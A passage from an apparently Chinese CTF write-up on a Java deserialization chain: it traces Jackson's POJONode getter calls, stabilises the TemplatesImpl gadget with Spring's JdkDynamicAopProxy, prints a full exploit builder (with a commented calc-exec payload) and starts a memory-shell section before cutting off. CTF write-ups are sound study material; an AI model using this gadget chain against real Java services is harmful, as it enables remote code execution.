(com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>在  <code>com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField</code>  方法中利用反射来执行其  <code>getters</code>  方法</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103152329.png" alt="微信截图_20231103152329"></p>
<p>这次就调用了 getoutputProperties, 很好，👴喜欢🤪</p>
<p>那就往前看看哪里获取了 <code>getters</code></p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103152702.png" alt="微信截图_20231103152702"></p>
<p>在 <code>com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields</code>  中， <code>prop</code>  数组存储了 <code>getters</code> , 通过循环遍历所有 <code>getters</code>  并调用 <code>serializeAsField</code></p>
<p>追踪一下这个变量，从 <code>	_props</code>  获得</p>
<p>最终在 <code>com.fasterxml.jackson.databind.introspect</code>  赋值</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">collectAll:<span class="number">418</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getJsonValueAccessor:<span class="number">270</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findJsonValueAccessor:<span class="number">258</span>, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findSerializerByAnnotations:<span class="number">391</span>, BasicSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createSerializer2:<span class="number">224</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">createSerializer:<span class="number">173</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createUntypedSerializer:<span class="number">1495</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">_createAndCacheUntypedSerializer:<span class="number">1443</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findValueSerializer:<span class="number">544</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findTypedValueSerializer:<span class="number">822</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103220943.png" alt="微信截图_20231103220943"></p>
<p>这里就是第一次决定 <code>getters</code>  顺序</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231104081525.png" alt="微信截图_20231104081525"></p>
<p>随后通过 <code>getDeclaredMethods</code>  获取方法，那这里获取方法的顺序是不固定的。</p>
<p>并且，在 <code>com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer</code>  方法里，会将获取的方法顺序进行缓存，之前提到过了，缓存后会进入其它 if。</p>
<p>因此第一次打不通，之后也无法打通了</p>
<h3 id="为什么顺序不一定"><a class="markdownIt-Anchor" href="#为什么顺序不一定">#</a> 为什么顺序不一定</h3>
<p>获取顺序是根据地址的大小来排序的，期间存在内存 free 的动作，那地址是不会一直线性变化的，之所以不按照字母排序，主要还是为了速度考虑，根据地址排序是最快的。</p>
<p>是反射  <code>getDeclaredMethods</code>  获取到方法的顺序是不确定的，最终导致执行相关 getter 方法的顺序也是不确定的，当  <code>TemplatesImpl</code>  的  <code>getStylesheetDOM</code>  方法先于  <code>getOutputProperties</code>  方法执行时就会导致空指针异常从而导致调用链报错中断，exp 利用失败。</p>
<h3 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法">#</a> 解决方法😊</h3>
<p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code>  解决问题</p>
<h4 id="实现"><a class="markdownIt-Anchor" href="#实现">#</a> 实现</h4>
<p>众所周知，java 有个 b 玩意叫做 <code>动态代理</code> ，很 nb,👴只在 cc 中用过，不清楚.</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]{TestInterface1.class, TestInterface2.class}, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) {</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> {</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"eat something"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"say something"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> {</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable {</span><br><span class="line">        System.out.println(<span class="string">"invoke dynamic proxy handler"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105214715.png" alt="微信截图_20231105214715"></p>
<p>这是执行结果，可以看懂能获取到的方法，完全取决于接口实现了哪些方法</p>
<p>而  <code>javax.xml.transform.Templates</code>  接口其只有  <code>newTransformer</code>  和  <code>getOutputProperties</code>  这个两个方法，让他作为我们代理所需的接口，这样最终通过  <code>getDeclaredMethods</code>  获取到的方法就只有  <code>newTransformer</code>  和  <code>getOutputProperties</code>  了，那么最终获得的 getter 方法便只有  <code>getOutputProperties</code>  了。</p>
<p>因此只需要挂代理，就只会获取接口方法</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class}, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) {</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"eat something"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"say something"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> {</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable {</span><br><span class="line">        System.out.println(<span class="string">"invoke dynamic proxy handler"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106082615.png" alt="微信截图_20231106082615"></p>
<p>这两个方法是 <code>Templates</code>  里面定义的接口方法</p>
<p><code>JdkDynamicAopProxy</code>  是 Spring 框架中的一个类，它实现了 JDK 动态代理机制，用于创建代理对象来实现面向切面编程（AOP）的功能。</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215128.png" alt="微信截图_20231105215128"></p>
<p>这里能够控制 advised</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215235.png" alt="微信截图_20231105215235"></p>
<p>这里会触发反射方法，这里 <code>advised</code>  前面说过了可控</p>
<p>我们将所需的  <code>TemplatesImpl</code>  的对象用  <code>org.springframework.aop.framework.AdvisedSupport</code>  封装即可</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">oldProxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">setProxyContext</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215851.png" alt="微信截图_20231105215851"></p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105220106.png" alt="微信截图_20231105220106"></p>
<h3 id="构造"><a class="markdownIt-Anchor" href="#构造">#</a> 构造</h3>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span>);</span><br><span class="line">Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">advisedSupport.setTarget(templatesImpl);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class}, handler);</span><br><span class="line"><span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxyObj);</span><br></pre></td></tr></tbody></table></figure>
<p>👴の最後のエクスプロイト</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception{</span><br><span class="line"><span class="comment">//        ClassPool classPool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = classPool.get(evilref.class.getName());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(constructor);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//byte[][] codes = new byte[][]{code};</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        ref(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]{});</span><br><span class="line">        ref(templates, <span class="string">"_name"</span>, <span class="string">"shanghe"</span>);</span><br><span class="line">        ref(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">"javax.management.BadAttributeValueExpException"</span>).getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(exp);</span><br><span class="line">        WriteToFileExample(serialize_func.encryptToBase64(<span class="string">"ser.bin"</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteToFileExample</span><span class="params">(String args)</span> {</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">"这是要写入文件的字符串内容"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">"output.txt"</span>));</span><br><span class="line">            writer.write(args);</span><br><span class="line">            writer.close();</span><br><span class="line">            System.out.println(<span class="string">"字符串已成功写入文件。"</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">            System.out.println(<span class="string">"写入文件时发生错误："</span> + e.getMessage());</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(Object obj,String field,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException {</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">reffield</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        reffield.set(obj,value);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException{</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="内存的使用"><a class="markdownIt-Anchor" href="#内存的使用">#</a> 内存🐎的使用🥵👴</h2>
<p>捏麻麻滴，太复杂了，还要写个内存马找到 RASP, 还好👴技高一筹.</p>
<h3 id="列目录"><a class="markdownIt-Anchor" href="#列目录">#</a> 列目录</h3>
<p>nm, 跟喝大了一样，整这 b 玩意，艹😡</p>
<p>首先来一个递归列出所有目录文件的</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 